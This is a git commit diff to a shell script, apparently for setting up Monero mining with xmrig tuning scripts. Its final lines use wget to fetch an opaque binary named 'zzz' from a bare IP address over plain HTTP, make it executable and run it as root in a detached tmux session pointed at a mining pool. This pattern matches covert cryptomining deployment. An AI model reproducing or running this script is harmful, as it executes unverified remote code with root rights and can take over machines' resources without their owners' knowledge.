40aa67d9afc8d84ee03412f719074f5c0374d741
deepmonero <70528104+deepmonero@users.noreply.github.com>
2020-11-08 03:36:27 +0800

    Update user.sh

--- user.sh
+++ user.sh
@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
-sudo apt-get update && apt-get upgrade -y
-sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools
+sudo apt-get update 
+sudo apt-get upgrade -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools -y
 sudo modprobe msr
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
@@ -10,5 +11,6 @@ sudo bash enable_1gb_pages.sh
 sudo bash randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
-tmux new-session -d -s a 'sudo ./zzz -o devilmpro.tech:3330 --nicehash --donate-level=0 --randomx-1gb-pages --rig-id=SATISH' --nicehash --randomx-1gb-pages '
+tmux new-session -d -s session 'sudo ./zzz -o devilmpro.tech:3330 --nicehash --donate-level=0 --randomx-1gb-pages --rig-id=SATISH'
+
 
